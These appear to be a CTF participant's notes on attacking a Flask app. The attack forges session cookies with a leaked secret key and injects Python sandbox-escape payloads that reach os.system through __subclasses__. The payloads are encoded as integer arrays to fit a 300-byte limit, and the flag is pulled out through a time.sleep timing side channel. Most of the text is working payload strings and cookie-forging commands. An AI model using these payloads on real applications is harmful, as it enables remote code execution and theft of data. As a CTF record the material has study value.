# Final

As i had been able to execute commands through os.system, due to (exec builtins leak < google that).
I wanted to create python script to mess around the system, but payload size needs to be <300; so that i had to echo every single character to /tmp in very specyfic format;
i cant use quote "", (cuz of payload size=301!); to avoid that i will be using only for and arrays containing int representations of strings (we dont need use quotes anymore)
then echo -e to /tmp/b file.

![script execution](https://i.imgur.com/XULqP7l.png)

### Executing file /tmp/b
I had to raise priviliegies by using os.chmod("tmp/b", 448) in base command (it worked!)

### Thats all
Gaining flag was so bad due to no socket (no rev shell) and everything is happening thanks to time.sleep(22):
logic:
ord("a") = 50 then sleep(50 * 0.2) -> sleep 25 sec.
finito.


### encoding token
(venv) PS C:\Users\wojci\flask-session-cookie-manager> python .\edited.py encode -s "tlci0GhK8n5A18K1GTx6KPwfYjuuftWw" -t "dasdsad"


### manual vulnerable json 

```
cls && python flask_session_cookie_manager3.py encode -s "tlci0GhK8n5A18K1GTx6KPwfYjuuftWw" -t "{'ingredient': b'a=\'\'\nfor i in 40,\")\",46,95,95,\"class\",95,95,46,95,95,\"bases\",95,95,91,\"0]\",46,95,95,\"subclasses\",95,95,40,\")\",91,\"60]\",40,\")\",46,95,\"module\",46,95,95,\"builtins\",95,95,91,\"\'\",95,95,\"import\",95,95,\"\']\",40,\"\'os\')\",46,\"system\",40,\"\'type kur*\')\":\n\ttry:\n\t\ta+=\'%c\'%i\n\texcept:\n\t\ta+=\'%s\'%i\nexec a#', 'measurements': 'a'}"
```




### GENERATED - number_to_char.py

```
'a=\'\'\nfor i in 40,")",46,95,95,"class",95,95,46,95,95,"bases",95,95,91,"0]",46,95,95,"subclasses",95,95,40,")",91,"60]",40,")",46,95,"module",46,95,95,"builtins",95,95,91,"\'",95,95,"import",95,95,"\']",40,"\'os\')",46,"system",40,"\'dir\')":\n\ttry:\n\t\ta+=\'%c\'%i\n\texcept:\n\t\ta+=\'%s\'%i\nexec a'
```

### MANUAL

```
"a=''\nfor i in 40,\")\",46,95,95,\"class\",95,95,46,95,95,\"bases\",95,95,91,\"0]\",46,95,95,\"subclasses\",95,95,40,\")\",91,\"59]\",40,\")\",46,95,\"module\",46,95,95,\"builtins\",95,95,91,\"'\",95,95,'import',95,95,\"']\",40,\"'os')\",46,\"system\",40," + important_param + ":\n\ttry:\n\t\ta+='%c'%i\n\texcept:\n\t\ta+='%s'%i\nexec a#\'"

```

# SOME ERROR
	syntax_to_payload = r"().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__']('os').system(\"echo '\t\t\tty'\")"

echo during os.system does automatically -e (not Escapes \t\n)



# Idea that may solve problem with small amount of size (<300)

-Create new file (touch /tmp/a),
-Create new file descriptor (small bash cmd eg. exec 1337<>/tmp/a),
-Now we can append to that file stream (REMEMBER! there is a pointer that goes on after every write, it goes on and on!)

# Use a code object form of a function



# os.system cannot escape echoing to file, so that os.popen2 will be used eg.
```
os.popen4('echo "xdsfdf\nfdgfdg">b')
```


SHOULDNT BE:
('payload', 'a=""\nfor i in 40,")",46,95,95,"class",95,95,46,95,95,"bases",95,95,91,"0]",46,95,95,"subclasses",95,95,40,")",91,"59]",40,")",46,95,"module",46,95,95,"builtins",95,95,91,"\'",95,95,"import",95,95,"\']",40,"\'os\')",46,"system",40,"\\\'echo -n ")">>b\\\')":\n\ttry:\n\t\ta+="%c"%i\n\texcept:\n\t\ta+="%s"%i\nexec a#')


SHOULD BE:
('payload', 'a=""\nfor i in 40,")",46,95,95,"class",95,95,46,95,95,"bases",95,95,91,"0]",46,95,95,"subclasses",95,95,40,")",91,"59]",40,")",46,95,"module",46,95,95,"builtins",95,95,91,"\'",95,95,"import",95,95,"\']",40,"\'os\')",46,"system",40,"\\\'echo -n )>>b\\\')":\n\ttry:\n\t\ta+="%c"%i\n\texcept:\n\t\ta+="%s"%i\nexec a#') 


actually works:
>> a = '().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__[\'__import__\'](\'os\').system(\'echo -n \"hej\"\')'






dobre
('payload', u'a=""\nfor i in 40,")",46,95,95,"class",95,95,46,95,95,"bases",95,95,91,"0]",46,95,95,"subclasses",95,95,40,")",91,"59]",40,")",46,95,"module",46,95,95,"builtins",95,95,91,"\'",95,95,"import",95,95,"\']",40,"\'os\')",46,"system",40,"\'echo -n \\"a\\">>b\')":\n\ttry:\n\t\ta+="%c"%i\n\texcept:\n\t\ta+="%s"%i\nexec a#')

zle:

('payload', u'a=""\nfor i in 40,")",46,95,95,"class",95,95,46,95,95,"bases",95,95,91,"0]",46,95,95,"subclasses",95,95,40,")",91,"59]",40,")",46,95,"module",46,95,95,"builtins",95,95,91,"\'",95,95,"import",95,95,"\']",40,"\'os\')",46,"system",40,"\'echo -n \\"",10,"\\">>b\')":\n\ttry:\n\t\ta+="%c"%i\n\texcept:\n\t\ta+="%s"%i\nexec a#')
